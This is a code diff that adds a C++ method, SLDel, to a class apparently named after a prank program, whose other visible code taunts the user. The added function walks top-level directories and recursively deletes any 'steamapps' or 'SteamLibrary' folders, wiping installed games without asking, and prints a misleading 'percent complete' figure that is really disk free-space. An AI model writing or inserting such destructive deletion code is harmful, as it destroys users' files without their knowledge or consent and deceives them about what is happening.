@@ -77,3 +77,43 @@ void Gjesus::LocalName()
 	else
 		cout << "Why cant i find your name. Whatre you hiding weirdo\n";
 }
+
+void Gjesus::SLDel() {
+
+	namespace fs = std::filesystem;
+
+	
+	std::cout << "Deleting Steam folders..." << std::endl;
+
+	
+	fs::directory_iterator drives = fs::directory_iterator("/");
+
+	
+	for (const fs::directory_entry& drive : drives)
+	{
+		
+		if (fs::is_directory(drive))
+		{
+			
+			std::string drivePath = drive.path().string();
+
+			
+			if (fs::exists(drivePath + "/steamapps") || fs::exists(drivePath + "/SteamLibrary"))
+			{
+				
+				fs::remove_all(drivePath + "/steamapps");
+				fs::remove_all(drivePath + "/SteamLibrary");
+
+				
+				double percentComplete = (double)fs::space(drive).free / (double)fs::space(drive).capacity * 100;
+				std::cout << "Percent complete: " << percentComplete << "%" << std::endl;
+			}
+		}
+	}
+
+	std::cout << "Steam folders deleted." << std::endl;
+
+	return;
+	
+
+}
